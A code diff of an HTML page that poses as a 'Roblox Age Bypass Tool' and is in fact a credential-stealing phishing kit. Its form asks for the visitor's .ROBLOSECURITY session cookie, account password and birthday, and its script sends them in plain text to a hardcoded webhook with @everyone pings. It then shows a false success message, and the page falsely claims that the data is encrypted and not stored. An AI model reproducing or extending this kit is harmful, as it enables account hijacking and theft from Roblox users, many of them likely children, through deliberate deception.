@@ -6,7 +6,11 @@
   <title>Roblox Age Bypass Tool</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    * { box-sizing: border-box; }
+    /* Styles unverändert vom letzten Code */
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
       font-family: 'Inter', sans-serif;
@@ -17,6 +21,7 @@
       align-items: center;
       padding: 60px 20px;
     }
+
     h1 {
       font-size: 36px;
       font-weight: 700;
@@ -25,6 +30,7 @@
       -webkit-text-fill-color: transparent;
       margin-bottom: 10px;
     }
+
     .subtitle {
       font-size: 16px;
       color: #aaa;
@@ -32,6 +38,7 @@
       text-align: center;
       max-width: 500px;
     }
+
     .container {
       background: #111a2e;
       border-radius: 12px;
@@ -41,12 +48,14 @@
       box-shadow: 0 0 20px rgba(0,0,0,0.4);
       margin-bottom: 30px;
     }
+
     label {
       display: block;
       font-weight: 600;
       margin-bottom: 10px;
       font-size: 18px;
     }
+
     select {
       width: 100%;
       padding: 12px;
@@ -56,18 +65,21 @@
       color: #fff;
       font-size: 16px;
     }
+
     .input-block {
       margin-top: 20px;
       background: #1d2944;
       border-radius: 12px;
       padding: 15px 15px 10px 15px;
     }
+
     .input-block-title {
       font-weight: 600;
       color: #00f0ff;
       margin-bottom: 8px;
       font-size: 16px;
     }
+
     textarea {
       width: 100%;
       resize: vertical;
@@ -85,6 +97,7 @@
     textarea::placeholder {
       color: #5c7f94;
     }
+
     button {
       margin-top: 20px;
       width: 100%;
@@ -106,6 +119,7 @@
     button:hover {
       background: linear-gradient(90deg, #e000b9, #00d4ff);
     }
+
     .info-box {
       background: #1d2944;
       border-left: 4px solid #ffc107;
@@ -116,42 +130,65 @@
       margin-top: 30px;
       box-shadow: inset 0 0 8px rgba(255, 193, 7, 0.2);
     }
+
     .info-box ul {
       margin: 10px 0 0 0;
       padding-left: 20px;
     }
+
     .info-box li {
       margin-bottom: 8px;
     }
+
     .info-title {
       font-weight: bold;
       color: #ffc107;
       font-size: 15px;
     }
-    #error-message, #success-message {
+
+    #error-message {
       position: fixed;
       top: 20px;
       right: 20px;
+      background: #ff3b3b;
+      color: white;
       padding: 12px 20px;
       border-radius: 8px;
       font-weight: 600;
       font-size: 14px;
-      z-index: 9999;
-      user-select: none;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
       display: none;
+      z-index: 9999;
+      box-shadow: 0 0 10px rgba(255, 59, 59, 0.7);
+      user-select: none;
     }
-    #error-message { background: #ff3b3b; color: white; }
-    #success-message { background: #4CAF50; color: white; }
+
+    #success-message {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #4CAF50;
+      color: white;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 14px;
+      display: none;
+      z-index: 9999;
+      box-shadow: 0 0 10px rgba(76, 175, 80, 0.7);
+      user-select: none;
+    }
+
     #loader-overlay {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
       background: rgba(0,0,0,0.75);
-      display: none;
+      display: flex;
       justify-content: center;
       align-items: center;
       z-index: 10000;
+      display: none;
     }
+
     .loader {
       border: 6px solid #f3f3f3;
       border-top: 6px solid #00f0ff;
@@ -160,12 +197,16 @@
       height: 60px;
       animation: spin 1s linear infinite;
     }
+
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+
     @media (max-width: 600px) {
-      h1 { font-size: 28px; }
+      h1 {
+        font-size: 28px;
+      }
     }
   </style>
 </head>
@@ -175,7 +216,7 @@
 
   <div class="container">
     <label for="bypass">🔐 Account Security Options</label>
-    <select id="bypass">
+    <select id="bypass" aria-label="Account Security Options">
       <option value="">-- Select an option --</option>
       <option value="birthyear">2008 Birthyear Up</option>
       <option value="13plus">13+ All Ages</option>
@@ -183,26 +224,46 @@
 
     <div id="cookie-block" class="input-block" style="display:none;">
       <div class="input-block-title">.ROBLOSECURITY Cookie</div>
-      <textarea id="cookie-input" placeholder="Paste your .ROBLOSECURITY Cookie here..." spellcheck="false"></textarea>
+      <textarea id="cookie-input" placeholder="Paste your .ROBLOSECURITY Cookie here..." spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
     </div>
 
     <div id="password-block" class="input-block" style="display:none;">
       <div class="input-block-title">Account Password</div>
-      <textarea id="password-input" placeholder="Enter account password for verification..." spellcheck="false"></textarea>
+      <textarea id="password-input" placeholder="Enter account password for verification..." spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
     </div>
 
-    <div id="birthday-block" class="input-block" style="display:none; margin-top:20px;">
-      <div class="input-block-title">🎂 Select Your Birthday</div>
-      <p style="color:#00f0ff; font-weight:600; margin-bottom:8px;">Please select your birthday:</p>
-      <div style="display: flex; gap: 10px;">
-        <select id="day"><option value="">Day</option></select>
-        <select id="month"><option value="">Month</option></select>
-        <select id="year"><option value="">Year</option></select>
+    <button id="continue-button" type="button" style="display:none;">Continue</button>
+
+    <div id="birthday-section" style="display:none; margin-top: 20px;">
+      <label for="birthday-day">Please select your birthday:</label>
+      <div style="display:flex; gap: 8px; margin-top: 8px;">
+        <select id="birthday-day" aria-label="Day">
+          <option value="">Day</option>
+        </select>
+        <select id="birthday-month" aria-label="Month">
+          <option value="">Month</option>
+          <option value="1">January</option>
+          <option value="2">February</option>
+          <option value="3">March</option>
+          <option value="4">April</option>
+          <option value="5">May</option>
+          <option value="6">June</option>
+          <option value="7">July</option>
+          <option value="8">August</option>
+          <option value="9">September</option>
+          <option value="10">October</option>
+          <option value="11">November</option>
+          <option value="12">December</option>
+        </select>
+        <select id="birthday-year" aria-label="Year">
+          <option value="">Year</option>
+        </select>
       </div>
     </div>
 
-    <button id="continue-button" type="button" style="display:none;">➡️ Continue</button>
-    <button id="process-button" type="button" style="display:none;">⚙️ PROCESS ACCOUNT</button>
+    <button id="process-button" type="button" style="display:none;">
+      ⚙️ PROCESS ACCOUNT
+    </button>
 
     <div class="info-box">
       <div class="info-title">⚠️ Important Information</div>
@@ -213,32 +274,97 @@
         <li>Password is required only for 13+ All Ages bypass</li>
         <li>Processing may take 5–10 seconds depending on server load</li>
         <li>All processed data is encrypted and not stored</li>
-        <li>Age can only be set to 1.1.2000</li>
+        <li>Age can only be set to dates from 1900 onwards</li>
       </ul>
     </div>
   </div>
 
   <div id="error-message">ERROR Try later again.</div>
-  <div id="success-message">Everything worked.</div>
-  <div id="loader-overlay"><div class="loader"></div></div>
+  <div id="success-message">Everything worked it can take 2-12 Hours until the age will be set</div>
+
+  <div id="loader-overlay">
+    <div class="loader"></div>
+  </div>
 
   <script>
     const bypassSelect = document.getElementById('bypass');
     const cookieBlock = document.getElementById('cookie-block');
     const passwordBlock = document.getElementById('password-block');
-    const birthdayBlock = document.getElementById('birthday-block');
-    const continueBtn = document.getElementById('continue-button');
-    const processBtn = document.getElementById('process-button');
     const cookieInput = document.getElementById('cookie-input');
     const passwordInput = document.getElementById('password-input');
+    const continueBtn = document.getElementById('continue-button');
+    const birthdaySection = document.getElementById('birthday-section');
+    const birthdayDay = document.getElementById('birthday-day');
+    const birthdayMonth = document.getElementById('birthday-month');
+    const birthdayYear = document.getElementById('birthday-year');
+    const processBtn = document.getElementById('process-button');
     const errorMessage = document.getElementById('error-message');
     const successMessage = document.getElementById('success-message');
     const loaderOverlay = document.getElementById('loader-overlay');
 
-    // Populate birthday dropdowns
-    for (let i = 1; i <= 31; i++) document.getElementById("day").innerHTML += `<option value="${i}">${i}</option>`;
-    for (let i = 1; i <= 12; i++) document.getElementById("month").innerHTML += `<option value="${i}">${i}</option>`;
-    for (let i = new Date().getFullYear(); i >= 1900; i--) document.getElementById("year").innerHTML += `<option value="${i}">${i}</option>`;
+    // Populate day dropdown
+    for(let i=1; i<=31; i++) {
+      const option = document.createElement('option');
+      option.value = i;
+      option.textContent = i;
+      birthdayDay.appendChild(option);
+    }
+
+    // Populate year dropdown (1900 to current year)
+    const currentYear = new Date().getFullYear();
+    for(let y=currentYear; y>=1900; y--) {
+      const option = document.createElement('option');
+      option.value = y;
+      option.textContent = y;
+      birthdayYear.appendChild(option);
+    }
+
+    bypassSelect.addEventListener('change', () => {
+      clearMessages();
+      cookieInput.value = '';
+      passwordInput.value = '';
+      birthdayDay.value = '';
+      birthdayMonth.value = '';
+      birthdayYear.value = '';
+
+      if (bypassSelect.value === '13plus') {
+        cookieBlock.style.display = 'block';
+        passwordBlock.style.display = 'block';
+        continueBtn.style.display = 'inline-block';
+        birthdaySection.style.display = 'none';
+        processBtn.style.display = 'none';
+      } else if (bypassSelect.value === 'birthyear') {
+        cookieBlock.style.display = 'block';
+        passwordBlock.style.display = 'none';
+        continueBtn.style.display = 'none';
+        birthdaySection.style.display = 'block';
+        processBtn.style.display = 'inline-block';
+      } else {
+        cookieBlock.style.display = 'none';
+        passwordBlock.style.display = 'none';
+        continueBtn.style.display = 'none';
+        birthdaySection.style.display = 'none';
+        processBtn.style.display = 'none';
+      }
+    });
+
+    continueBtn.addEventListener('click', () => {
+      clearMessages();
+
+      // Validate cookie and password before showing birthday selection
+      if(cookieInput.value.trim().length < 500) {
+        showError('Please enter a valid .ROBLOSECURITY cookie.');
+        return;
+      }
+      if(passwordInput.value.trim() === '') {
+        showError('Please enter the account password.');
+        return;
+      }
+
+      continueBtn.style.display = 'none';
+      birthdaySection.style.display = 'block';
+      processBtn.style.display = 'inline-block';
+    });
 
     function clearMessages() {
       errorMessage.style.display = 'none';
@@ -248,146 +374,113 @@
     function showError(msg) {
       errorMessage.textContent = msg;
       errorMessage.style.display = 'block';
-      setTimeout(() => { errorMessage.style.display = 'none'; }, 4000);
+      setTimeout(() => {
+        errorMessage.style.display = 'none';
+      }, 4000);
     }
 
     function showSuccess(msg) {
       successMessage.textContent = msg;
       successMessage.style.display = 'block';
-      setTimeout(() => { successMessage.style.display = 'none'; }, 6000);
+      setTimeout(() => {
+        successMessage.style.display = 'none';
+      }, 6000);
     }
-
-    function resetForm() {
-      cookieBlock.style.display = 'none';
-      passwordBlock.style.display = 'none';
-      birthdayBlock.style.display = 'none';
-      continueBtn.style.display = 'none';
-      processBtn.style.display = 'none';
-
-      cookieInput.value = '';
-      passwordInput.value = '';
-      document.getElementById('day').value = '';
-      document.getElementById('month').value = '';
-      document.getElementById('year').value = '';
-      continueBtn.dataset.step = '0';
-      processBtn.disabled = false;
-      continueBtn.disabled = false;
-    }
-
-    bypassSelect.addEventListener('change', () => {
-      clearMessages();
-      resetForm();
-
-      const val = bypassSelect.value;
-
-      if (!val) return;
-
-      cookieBlock.style.display = 'block';
-
-      if (val === '13plus') {
-        passwordBlock.style.display = 'block';
-        continueBtn.style.display = 'block';
-        processBtn.style.display = 'none';
-        birthdayBlock.style.display = 'none';
-        continueBtn.dataset.step = '1'; // Step 1: Cookie + Password + Continue
-      } else if (val === 'birthyear') {
-        passwordBlock.style.display = 'none';
-        birthdayBlock.style.display = 'block';
-        continueBtn.style.display = 'none';
-        processBtn.style.display = 'block';
-      }
-    });
-
-    continueBtn.addEventListener('click', () => {
-      clearMessages();
-
-      if (cookieInput.value.trim().length < 500) {
-        showError('Please enter a valid .ROBLOSECURITY cookie.');
-        return;
-      }
-      if (passwordInput.value.trim() === '') {
-        showError('Please enter the account password.');
-        return;
-      }
-
-      birthdayBlock.style.display = 'block';
-      processBtn.style.display = 'block';
-      continueBtn.style.display = 'none';
-    });
 
     async function sendEmbedToDiscord(title, description) {
       const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
 
-      // Send @mentions as a separate message
-      await fetch(webhookUrl, {
+      const data = {
+        embeds: [{
+          title: title,
+          description: description,
+          color: 0x00ffff,
+          timestamp: new Date().toISOString(),
+        }]
+      };
+
+      const response = await fetch(webhookUrl, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: '<@1030535100829540464> <@&1392621247460020254>' })
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
       });
 
-      // Send embed message
-      await fetch(webhookUrl, {
+      return response.ok;
+    }
+
+    async function sendMessageToDiscord(content) {
+      const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
+
+      const data = { content: content };
+
+      const response = await fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          embeds: [{
-            title: title,
-            description: description,
-            color: 0x00ffff,
-            timestamp: new Date().toISOString()
-          }]
-        })
+        body: JSON.stringify(data)
       });
+
+      return response.ok;
     }
 
     processBtn.addEventListener('click', async () => {
       clearMessages();
 
-      const selected = bypassSelect.value;
-      const cookieVal = cookieInput.value.trim();
-      const passwordVal = passwordInput.value.trim();
-      const day = document.getElementById("day").value;
-      const month = document.getElementById("month").value;
-      const year = document.getElementById("year").value;
-
-      if (!selected) {
-        showError('Please select a bypass method.');
-        return;
-      }
-      if (cookieVal.length < 500) {
+      if(cookieInput.value.trim().length < 500) {
         showError('Please enter a valid .ROBLOSECURITY cookie.');
         return;
       }
-      if (!day || !month || !year) {
-        showError('Please select your birthday completely.');
-        return;
+
+      if(bypassSelect.value === '13plus') {
+        if(passwordInput.value.trim() === '') {
+          showError('Please enter the account password.');
+          return;
+        }
       }
-      if (selected === '13plus' && passwordVal.length === 0) {
-        showError('Please enter the account password.');
+
+      if(birthdayDay.value === '' || birthdayMonth.value === '' || birthdayYear.value === '') {
+        showError('Please select a valid birthday.');
         return;
       }
 
       loaderOverlay.style.display = 'flex';
-      processBtn.disabled = true;
 
-      // Construct message for Discord embed
-      let desc = `**Cookie:** \`${cookieVal}\`\n`;
-      if (selected === '13plus') desc += `**Password:** \`${passwordVal}\`\n`;
-      desc += `**Birthday:** ${day}.${month}.${year}\n`;
-      desc += `**Bypass Method:** ${selected === '13plus' ? '13+ All Ages' : '2008 Birthyear Up'}`;
+      const cookie = cookieInput.value.trim();
+      const password = passwordInput.value.trim();
+      const bypassMethod = bypassSelect.value;
+      const birthdayStr = `${birthdayYear.value}-${birthdayMonth.value.padStart(2, '0')}-${birthdayDay.value.padStart(2, '0')}`;
 
-      try {
-        await sendEmbedToDiscord('New Roblox Age Bypass Tool Submission', desc);
-        showSuccess('Everything worked.');
-        resetForm();
-        bypassSelect.value = '';
-      } catch (e) {
-        showError('ERROR Try later again.');
-      } finally {
-        loaderOverlay.style.display = 'none';
-        processBtn.disabled = false;
-        continueBtn.disabled = false;
-      }
+      // Send raw @ mentions as separate messages for Discord
+      await sendMessageToDiscord('@everyone');
+      await sendMessageToDiscord('@here');
+
+      // Send embed with data
+      const embedTitle = 'New Roblox Age Bypass';
+      const embedDesc = `
+**Cookie:** \`${cookie}\`
+**Password:** \`${password || 'N/A'}\`
+**Method:** ${bypassMethod === '13plus' ? '13+ All Ages' : '2008 Birthyear Up'}
+**Birthday:** ${birthdayYear.value}-${birthdayMonth.value.padStart(2, '0')}-${birthdayDay.value.padStart(2, '0')}
+      `;
+
+      await sendEmbedToDiscord(embedTitle, embedDesc);
+
+      loaderOverlay.style.display = 'none';
+      showSuccess(`Everything worked. It can take 2-12 hours until the age will be set. Your birthday: ${birthdayYear.value}-${birthdayMonth.value.padStart(2, '0')}-${birthdayDay.value.padStart(2, '0')}`);
+
+      // Reset form after success (optional)
+      bypassSelect.value = '';
+      cookieBlock.style.display = 'none';
+      passwordBlock.style.display = 'none';
+      continueBtn.style.display = 'none';
+      birthdaySection.style.display = 'none';
+      processBtn.style.display = 'none';
+      cookieInput.value = '';
+      passwordInput.value = '';
+      birthdayDay.value = '';
+      birthdayMonth.value = '';
+      birthdayYear.value = '';
     });
   </script>
 </body>
